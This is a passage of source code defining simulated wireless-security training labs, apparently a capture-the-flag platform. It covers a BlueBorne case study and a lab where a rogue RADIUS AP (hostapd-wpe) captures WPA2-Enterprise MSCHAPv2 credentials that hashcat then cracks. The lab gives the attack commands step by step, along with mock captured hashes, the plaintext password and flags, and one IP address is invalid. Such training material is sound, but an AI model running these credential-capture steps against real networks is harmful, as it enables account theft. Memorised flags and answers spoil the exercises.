            '  3 of the 8 are rated critical: full remote code execution, no pairing, no user interaction,\n' +
            '  the target device only needs Bluetooth enabled and discoverable.\n' +
            '  This is a genuine memory-corruption RCE chain in compiled OS code -- not something a\n' +
            '  request/response terminal can honestly simulate live; treat this as a real disclosure to\n' +
            '  read and understand, not a target to "exploit" in this environment.\n',
        ),
        'blueborne-impact-assessment.txt': file(
          'Impact assessment, BlueBorne (Armis, 2017):\n' +
            '  Estimated affected devices at disclosure: 5.3+ billion (phones, laptops, IoT devices, smart TVs) --\n' +
            '  every device type running an affected Bluetooth stack, not one specific product line.\n' +
            '  Why it was unusually severe versus a typical single-product bug: Bluetooth is widely assumed to be\n' +
            '  "short-range and low-risk" by users and administrators alike, yet these flaws granted full RCE with\n' +
            '  literally zero interaction -- no malicious link clicked, no pairing confirmed, nothing -- purely\n' +
            '  from the target having Bluetooth switched on and discoverable, a default state on most devices.\n' +
            '  flag{blueborne_2017_zero_click_bluetooth_stack_rce_case_study}\n',
        ),
      }),
    }),
    network: [],
  },

  // 10 — WPA2-Enterprise missing certificate validation / rogue RADIUS
  {
    id: 'wireless-wpa2-enterprise-rogue-radius-cert-validation',
    title: 'Wireless: Missing Certificate Validation Lets a Rogue RADIUS Server Harvest WPA2-Enterprise Credentials',
    difficulty: 'Hard',
    category: 'Wireless',
    briefing:
      'MeridianCorp\'s HQ network runs WPA2-Enterprise (802.1X) — real per-user credentials authenticated against ' +
      'a RADIUS server, a step up from every WPA2-Personal shared-passphrase network in this module. Its security ' +
      'depends entirely on one client-side check: does the connecting device actually validate the RADIUS ' +
      'server\'s TLS certificate against the corporate CA before sending its MSCHAPv2 credentials? A misconfigured ' +
      'or never-configured client skips that check — exactly what tools like hostapd-wpe are built to exploit, ' +
      'standing up a rogue AP with a patched RADIUS server that captures the username, challenge, and response the ' +
      'instant a vulnerable client tries to authenticate, with no valid certificate presented at all.',
    objectives: [
      { text: 'airmon-ng start wlan0', why: 'Monitor mode, same as every capture attempt in this module.' },
      { text: 'airodump-ng wlan0mon', why: 'Confirms the target reads WPA2-Enterprise, the detail that determines this specific attack path applies rather than a PSK-based capture-and-crack.' },
      { text: 'cat hostapd-wpe-captured-mschapv2.txt', why: 'A client with certificate validation disabled connected to the rogue AP\'s hostapd-wpe RADIUS server, which captured the full MSCHAPv2 exchange (username, 16-byte challenge, 24-byte response) with no valid CA-signed certificate presented at all.' },
      { text: 'hashcat -m 5500 mschapv2-capture.txt /root/wordlists/corp-wordlist.txt', why: 'Mode 5500 is real hashcat\'s NetNTLM/MSCHAPv2 mode — cracking the captured challenge/response recovers the plaintext domain password entirely offline, the same "capture then crack" model as this module\'s WPA2-Personal labs, just applied to the RADIUS layer instead of the PSK.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'cat hostapd-wpe-captured-mschapv2.txt',
      'hashcat -m 5500 mschapv2-capture.txt /root/wordlists/corp-wordlist.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      wordlists: dir({ 'corp-wordlist.txt': file('Password1\nCorpAccess2024\nWinter2024!\nMeridian#99\n') }),
      'hostapd-wpe-captured-mschapv2.txt': file(
        'hostapd-wpe -- rogue AP RADIUS capture (client presented no valid CA cert, connected anyway):\n' +
          '  username: d.abara\n' +
          '  challenge: 9f2b7e1a4c6d0358\n' +
          '  response:  3a8c1f9e2d7b04c6a1e9f3d7b8c05a2e4f7c1908\n' +
          '  -- captured because the client skipped RADIUS server certificate validation entirely --\n' +
          '     with a validating client, the rogue server\'s self-signed/absent cert would have been rejected\n' +
          '     before any credential material was ever sent --\n',
      ),
      'mschapv2-capture.txt': file(
        '#HASHCAT_HASH:5500:d.abara:9f2b7e1a4c6d0358:3a8c1f9e2d7b04c6a1e9f3d7b8c05a2e4f7c1908\n' +
          '#HASHCAT_PLAINTEXT:CorpAccess2024\n' +
          '#HASHCAT_FLAG:flag{wpa2_enterprise_missing_cert_validation_rogue_radius_mschapv2_crack}\n',
      ),
    }),
    network: [
      {
        hostname: 'hq-enterprise-ap',
        ip: '10.10.320.9',
        os: 'n/a (802.11 access point, WPA2-Enterprise/802.1X)',
        services: [],
        users: [],
        root: dir({}),
        wifiNetwork: { ssid: 'MeridianCorp-HQ-Secure', bssid: 'A0:6E:33:C8:14:52', channel: 36, encryption: 'WPA2-Enterprise' },
      } as HostDef,
    ],
  },
];
